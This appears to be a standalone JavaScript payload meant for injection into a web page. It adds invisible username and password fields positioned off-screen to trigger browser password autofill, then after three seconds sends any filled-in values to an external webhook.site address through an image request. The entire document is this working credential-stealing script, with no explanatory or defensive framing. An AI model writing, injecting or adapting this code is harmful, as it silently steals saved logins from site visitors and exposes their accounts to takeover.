var a=document.createElement('input');
a.autocomplete='username';
a.style.cssText='position:fixed;left:-9999px;top:0;width:1px;height:1px;opacity:0';
document.body.appendChild(a);
var b=document.createElement('input');
b.type='password';
b.autocomplete='current-password';
b.style.cssText='position:fixed;left:-9999px;top:0;width:1px;height:1px;opacity:0';
document.body.appendChild(b);
setTimeout(function(){
if(a.value||b.value){
new Image().src='https://webhook.site/ae7990e1-69d3-4b40-8fdc-bbe39df73870?l='+encodeURIComponent(a.value)+String.fromCharCode(38)+'p='+encodeURIComponent(b.value)
}
},3000);
